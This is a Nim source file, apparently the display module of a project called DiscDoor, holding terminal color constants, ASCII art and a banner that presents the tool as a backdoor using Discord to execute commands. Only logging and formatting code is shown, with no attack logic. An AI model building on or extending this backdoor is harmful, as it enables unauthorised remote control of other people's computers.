# Define Color

const
  resetColor = "\e[0m"
  lightCyanColor = "\e[96m"  # Azzurro chiaro
  yellow = "\e[33m"  # Azzurro chiaro
  bgORANGE = "\e[48;5;208m" # Sfondo arancione
  titleColor = "\e[1;97m\e[48;5;96m"
  eventColor = "\e[1;97m\e[48;5;93m"

let INFO = """
**Welcome to DiscDoor**

> Discdoor is a backdoor that exploits discord to execute commands.
> Click [here](https://www.github.com/rdwei/DiscDoor#Usage) to see the Usage. 
> _Created with <3 by [weird](https://www.instagram.com/rdwe_i)_.
"""


let ASCII = """
 ____  _         ____              
|    \|_|___ ___|    \ ___ ___ ___ 
|  |  | |_ -|  _|  |  | . | . |  _|
|____/|_|___|___|____/|___|___|_|  
                                   
Ctrl-c to exit.

CChelp on discord for instruction.
"""

proc PrintEvent(event: string, typ: string) =
  if typ == "commandExecuted":
    echo eventColor & "::" & typ & "::" & resetColor & " - " & eventColor & event & resetColor & " - " & titleColor & now().format("hh:mm") & resetColor & "\n"
  
  elif typ == "Default":
    echo eventColor & "::" & event & "::" & resetColor & " - " & titleColor & now().format("hh:mm") & resetColor & "\n"
